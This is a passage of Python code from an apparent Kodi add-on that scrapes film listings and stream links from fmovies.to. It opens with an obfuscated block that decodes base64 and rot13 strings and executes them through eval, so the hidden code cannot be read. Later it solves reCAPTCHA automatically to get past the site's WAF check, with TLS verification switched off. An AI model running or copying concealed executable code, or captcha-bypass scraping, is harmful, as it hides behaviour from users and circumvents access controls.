QL1ZmD0AQH2Zmx1ZwD2AmR0MQD3AmpmZmpmAmNmZGHjAwR3ZQplAGZ3AQLlAwL2MGLkZmL2MGH3AQV2AQZmA2R1AwHkAwLlLwLkAmxmZmH3AJR2AwMxAGt0AwEzATR2MQHjAGH3ZmZ2AQx3ZQZ1AQt3ZQZ1ZmZ1ZQL1AmN2MGplATD0MGquAmt2AwMzAGVmBGH0AQDmAQHkAQDmAGMuAmL1ZGMyAwR1AGD5AwL2MGZ1ATHmBQD4AmV3BQZkAmV1ZwHlAwDmZQMzAGx2ZwZjAGLmAwquZmp0LmpkAmxmAmp3AGR2AQMzAwV0AGp4AwD2AwWzAzLmAQZlZmV2ZmZ5ZzL0MQp4AwR3AwL3AGZmBGH4ATD2AGZ2Az'
oracle = 'I2ZTRhNDU2ZTU5NjYzMjM0Njc1YTcyNzY1MjdhNWE1ODUxNjg0MzUzNmE0ZDRlNzU1MjQ2NGI1MjZkNzUyZjMxNzA0MzY2NWEzMjY5NDk3ODcwMzI2NzRjNDEzMjM5MzYzOTU5NGE3MjU4NTI0Yjc5NDk1MDUxNDk3NDcwMzY3NDRhNDk2MTM2NmU0YzU2NDI0NzQ2Nzg2ZTRiNDI2MjY0Mzc1YTY3MmY0NzM0Mzc1MTYzNDU3NTU3MzA1NjY1NDM2NTU2NzAzNjRlNDM2MTU3NmM0ZTQzNGU2ZjU0NTM0ZTQxNTQ1ODQ1MzE1YTY0NjE2MTY4Njc3OTMxNWEyZjZkNDY3MDMwNmE2YTY4NGY2ODQ3NGM1MjU5NzE0NzU2NTM3MjM5NjE0YzVhNjU1MTQzNzMzODZjNWE0ZDQ4NTc2ZDc5MzA2OTQ5NWE0NjczNjc2ZDcyNTM2MjQ1NDI3MjZhNTA3NjU5NTk1ODc1NmUzOTQ1NmE0NDU5MzE3NjZlNDU1MDcwNTE0NzZiNGM1MTRjNTIyZjY4NTg2ZjM0NjM0OTQ5NjU1OTJiNzg0ZTMyNTE0ZjczNDg0ZjZjNGQzOTRkNzU2YjMxNTQ0OTcwMzI2NTYxNTg2ODRhNzczMDM1NjE1NTY5NGE3MjYyNjI1MzZmNzc3NDQzNDE2ZjUxNGU3NzU4NjY0YTMxNmM3NTMzMzY3NDY4NDg3MzczNTUzMDU2NzI3MDZjNWE0Yzc0NDk2OTQ1NGU3MDYxNDY1NjQ0NGQzNTUzNjg2ODcyNjE0YjQzNTE3MDRiMzQ3NzZjNTMzMDUyNDEzMjM0NTM0NjQzNGQ1OTU0NmQ1MTRhNGU3NTcxNTE2ZTc4NTQ0NjQxNjQ3NjM1MzA2NzU5NGM1NDQ1NGM2OTQ2NjM2YTY3Nzk3NzZlNzA0MzY2NTMyZjMxNDI2ZTZhMzQ2ODQ3NGU0YTY2NTQ1MDc5NmM2ODRhNjg0Mjc0MzIzNzc0MzI2MjRhNTg2MjQ1NGQ0ODUxNmQ0ZTcyNTE2ZDM0NmM1Mjc4NGU3MzU5NTM3NTMwMmI3NjcxNjU0YzU0Njk2ODQyNDU3NDQ0MzY3MDcwNjY0NDUzNmI1NDU3NmE2MzMwNDQ0NTM0NDk1Nzc2NGU0NDRmNTU3NDQzNzUzNDU0NjkzMjQ0NGE2NjUzNDE2NjMyMzQ2MzZhNDQzMDZjNDI2YzQ3Njg0ZjM2NDg3YTU2NDU1MjQzNjk3MTZjNzA0MTYyMzU0NTYzMzk2Mzc3NTM1Mzc4NzE0ZjQ3NDU1MDUyNTk2OTY2N2E0YTcxNTE1NzY2MzY0YjY2MmI2MjRiNTc2ODQxNDU0YTU0NDc3NjRiNjE1NzZlNzI3MzZmMzIzMDc0MzM1NjZmNTQ1YTRkNzY1MjQyNzY1MTMwMzI2MjUwNGUzMTZhMzc1NDM4NDc0ZTQ3NzU1OTdhNjE2NjcxNmQ1ODMwNTM1MDMwNTA1OTMzNTE2MTQyNjQ1OTZmN2E2OTQzNGI0MTc2NTM0ZDU1NzgzODYzNGE1MjQyNjE0YTc3NTE0YzY2NTc2YTM5N2E0NzMxNjY2NjZkNTM0NTRlNTk1ODZjNGIzOTQ4NTE2ZjUyNTM0ZTU3NTEyZjZhNjM2NzQ1NzgzMDMzMzg2MjZmNGM1NTU4NDQzMDM2NjM3MjUzMzk0NTM5NGI0NzUwMzI1NzQ1NTI0ZTZlMzYzNjMzNzQ0NjYxNGM2OTZiNjYyYjQzNjM2NjY4NmY3ODYyNjQzNDQ5NDY2NTUzNDU1YTRkNjc1ODM3NjI2MTZkNDg1NzY2MzI0MjQyMmY3MDU1NjQ3NzU4NzQ1MDQ5MzE0YjZlNDk3MjZhNmY0YzcxNjE1MjMzNzQ1MjU1MzY2YTY3NmM0YTQ0Njc0OTU0MzQ2MjQxMzE3MDU1MzUyZjcwMzE3NDQ2MmI1MDQyNDk2OTcwNjYzNDM0NzU3MTZmNmY1MjMwNGM3MDQ1MmY1MTMwNjM2ODU0NDU2YjUxNzg0ODRlNDI3ODc4Nzg0YzUyNDg2NzJmNzI0ZTM5NDM2OTRjNTYzOTcxMzc0ODZjNzMzNTRiN2EzMjc5NDEyZjMyMmI0ZTMwNDc2NjYxNTE1NTM3MzE0MzRkMmY2NjQ1NjQ0OTU2NjM0YTMyNjQ0ZTc5NjgzMzQ1Nzk0ZjQxNDU2OTZlNDk2YTc4NDY0YjQ5Mzg1MTUwMzgyYjczNDM1MTU4Nzk3NTUyMzU2ODM5NTk1MzUxMzE2YzZmNjUzMjY1NTM1MDZhNDM2NTMwNDczODRhNzczMjcwNjY3MDUyMzk3MTc2NDM0MjZlNGY0YTZiNjk0YzMwNDg0MjRkNjY2NjUyNjY0OTMwNDg3MzZhNjI2ODUxNDU3NDZmNTU3MzQxNjQ0MzY2NGU1MTZlMzc2MzYxNjI3ODY3NmYzNzdhMzk0MjM2MzE3NDQxNzM1MjdhNjc2NTZmNTYzMzQ3NDQ1NjRlNDQ1NzcyNTcyYjZhNmY1NDJiNzc0YTYzMzE1MTU0NmUzMDczMzQ2ZjZhNGQ0MTMzNmE1NDQ4MzU0ODY1NjU3MTUyNGE0NzRkNTUzNDJiNGIzNDMxNmM0MzU5MzU2YzRmNTA1NzU0NGI0ZjQ0NDY1MDcxNjQ2NTc2NTE2YTdhNGQ3NDRhMzk3MTM2MzE2ZjY1Njg1MjM0NTYzNjcyNGI0ODZhNjc3MTU1NjgyYjVhNGE3ODRkNjEyYjZmNTgzMDU4MmYzNDU2Njg0Mzc4N2E0Zjc1MzA3OTRkMzczNzQ1MzMzOTUzNmI0YzMzNzM3NzZjNjk3MDMxMzQ0YTM5NjU3Mjc2NGY0NDQ5MzU2NzMzMzc3MTQ4MmY3NDU4NDg0YTQ1Nzk3YTc0NzQ2MTYyMzQ1NDM2NGY0MzcyNDI0Zjc2Njg2NTUwMzk2YjU4MzQ1NjUxMzkzNjc0NGM3ODZiNTg0NzQ4Mzk3MDRhNzA0NzRhNGU2YTU2NjM1ODU5NGQzODU4NDI1NjQyNDQ2OTMxNmE2MTc0MzQ1NTQ4NmY2MTMwMzA2ZjU2NTkyZjU3NDM0NDZiNjk0Njc1NmYzNDUzMzI2ODRmNTEzNzcxNmQ2ODY4NzA3MDM5MzM2ZjMwNzg1ODY4NGM3MTRhNGY2YTYxNzQ3MTQ3NDg2YzZiMzY0NTMzMmY1MDZhNGQ3NjZkNjU2ZjRjNTk2MzRiNTk2NTQ4NTI0ZTY5MzE1MzRkMmYzNzU3NjMzNjY0NzU2ODM4NGQ0ZTRhMmY0NTQ3MmI3NzZlMzQzNzZhNmIzNTc3MzA3YTVhNTQ2MjY0Njg2ZjZjNzc0ODJmNTg2ODRmNTkzNTMwNzQ1YTc4NDI1MDM1NGYzNjRjNzE1NTQ2NmI2NjY2NmE0ZDJiNDk0MzJmNDE0NDJiNmE3NDc5NDk3MTQ2MmY2YTZmNzI0OTZkMzQ2MjU5NGU1ODUzNmUyZjU1NDg0NDc0NzQ1MTY2MzMyZjc2NjU0MjUwNjY1NzQ4NDE3NDc0NDM2MTU2NGY0OTM1NDkzMDZkMmI1MjQ0NTc0MjY4MmI3NzQ4NzczMjZhNTQ0OTQ5NjM1NDRjMzI2MzUyNTMyZjM1NTE2NzQ4NjQ0YTQxMmY0ZTU1MzU3ODUxNzg2YzM2NDY0YjRjNjY2YjMxMzc0NzYyMzk2ODUwNzI2NTU1Nzg1NDRiNTAzMTY3NzQ0MTMyNTIyYjRjNDc0Njc3NTI3MTQ5NGEzOTRmNjQ0NDQxNjY0ZDYzMzY1MTYyMmY3MTRhNDg2OTU4NDI3NjJiNjk3NjRhNjU2ZTY3Njk0OTY1NTE3MjM3NTIzMDY2NDUzNjVhMzkzMzU3NjM1OTM2Nzg0ODZlNDY2NDY2NmY3OTM3NjE1MjU1N2EzNDZjNmUzNzQ4NGQ1MTM2Njg2MTZiNjQyZjU0Mzk2ZTM2NDg2OTQ2NTM1NTJiNzQ2MTM1N2E1ODM2NTA2NTc4NGE3ODMyNDM0ZjZjNzM1NDU4MzY0NjU0NGMzOTMyNzUzMDdhNzA0NTU5Mzc1OTM1NTE1MDMwNjY0ZjY4NjE1YTMzNDc2YTMwNGM2Yjc5NGQ3ODMyNzA0OTY1NzQ1NzZmNmY3NjRlNDQ3ODU3NTU1MDZkNGM2ZTJiNzk2ZjUwMzA0OTJiNzE0MzY0NjE0Yzc1NDU3NjZkNmU2ZTMyNmMyYjZmNWEzMDRjNGIzNDRhNjY1MTc1NjY3MTRiNzEzOTUxNmU1OTM0NzczMzUxNjM2OTZhN2E2Yzc2NTY0MjRmNGU2ZTJmNDU2YjQ1N2E3NDRmNmE0YzRkNzE0YzQ5Nzc1NjQ0NmE3OTUxNTE2ZDMzNTEzODZmNTYzMjc5NDQ2ODY5NzI2MTU1NTQ0MjZiNjY2OTZmNDk1ODU0MzYzMTY1Nzk2ZTU4NzY2ODU0NDE0YTMyNTA3NDZjNTA2MzM1NDM2OTUwN2E3OTZjNTAzNTY3NzU0ZjMyNmI3NjcxNmUzNzYxNmE1MjM4NDQ2Nzc0Mzc0MzMxNGM0MjZkNjYzNjY5MmIzNzUxNDYzMjU0NjEyYjY4NjE2YTMwNzk2ZTUwNGQ0YjM4NTA0ZDcxNzYzMDUxMzE3YTU2MzYzNTQ4NGQ0NDZlNzA3MTdhMzE2MjZhNzc0YzMwMzY0NjY0NDQzNDRlNTQ2YTcxNGYzMzU0NzA1NzM5MzY3YTQ4NjUzMDUwMmY2OTMxNzI3NTc2MzA2NTQyNzg3OTcwNjQzMTc4Mzk0NDU3NGU3MTc0NGI3NjQ1NTkzOTUwNjUzNDQ5NjQ3MzZhMzU2YTY2NjE0NDdhNDIzMjczNzYzMTZmNTgzMDQyNzgzMDUwNjgzMjZiNTU1NDU0Mzg2YzRjMzY3ODUwNTQ3NDVhNmI1MDM1NTE1MjM0Njg3ODQ4NmU1OTc3NzI0ODQ0NTg1MTcyNmQ3NjM5NDU3NzZmMzk1NzZjNGU2NjUwMzI0ODY4MzY0YTc2Nzk1NzYyNzM2MzYxNTg3NDM2NzQ0YjUzMmI1MjcxNzk3MzcxMmY1MzM0NTM2MzYzNmM0ZTU5MzI1MTQ3NTg2MzM1Njk3NDRlNzg1NDYzNjQ2NDUzMzg3NDMxNmU0ZjZmNzE3MDU1NjY0NTMyMmI2ZDZlNGE1NjRlMzk1MzU2NzMzMzcwNzQ0NzRkMzk3YTU3MzY1YTU2N2E1ODY2NGM0YTc1NTkzMzdhNjkzMTY0NGE2YTUyNWEzMDMzMzY0MTM5MzYzOTQ3NjQ1MDYzNmQ1MzY0NmY0Zjc2NTgzMzMwNjY1NjMyNDkzODZhNzIzNjJmNTI1MjYzNmIzODU2NjI0Mzc1NGE0ODMzNGY0YTQ3NjY1NzQyMzY3OTMzNTc1MTJmNmY1NTY1NmM0MTJiNTU3YTc4NmM1MzRmNzk2NzY5NTAyYjUxNjYzODU1NTk0YjY2MzE3NzM5NDU3NzM3NmU2YjRmMzk1NTc3MmYyYjUwNzA3MDY3NzEyZjQ4NTIzNTUxMzczNDJiNDM2MjJmNmI2YjQ4NTIzNzJiMzEyZjcwNmI1MTM2MzE1ODUxNzM2NDQ2MzA2MTU0NmM3ODY4NDY1NjUzNzY2YzRjMmY2ODQ1NjU1MDYyNDU2N'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))  
  
def getVerid(id):

    #ab='aaaaaa'#AAAAAAAAAA'#ABBDEEBBAABBAABB'#ggo()
    ab = 'DZmuZuXqa9O0z3b7'
    #ab='WeXfYR'

    
#   id = '41lj7'
    ac = id
    hj = dekoduj(ab,ac) #
    hja1 = dekodujNowe (ab,ac)

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   

    

    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    #hjkl = ab + hj2
    hjkl = hj2
    return hjkl
    
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    plot = PLchar(plot[0]) if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''

    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''

    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''

    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''

    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''

    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}

    headers.update({'Referer': href})
    
    #id = '41lj7' #################################

    verid = getVerid(id)
    recap="03AGdBq25eDJkrezDo2y"
    params = (
        ('id', id),
       # ('verified', verid),
        ('vrf', verid),
        ('token', recap),
    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html= (response.content)
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')

    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#

    html = (response.content)#.replace('\\"','"')
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')


    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',html)
    for linkid1,host in linki:
        tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

        linkid = re.findall(linkid1+'"\:"([^"]+)',html)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    


    if len(linki)>0:

        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Error[/B]', 'No content to display',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):

    try:    
        if sys.version_info >= (3,0,0):
            chra =repr(chra.encode('utf-8'))
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')
            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)#.content

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')

    params = (
        ('id', id),
    )

    headers.update({'Referer': href})
    response = sess.get('https://fmovies.to/ajax/episode/info', headers=headers, params=params, verify=False)#

    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
    if jsonab:
        url = jsonab.get('url',None)

    link2 = DecodeLink(url)

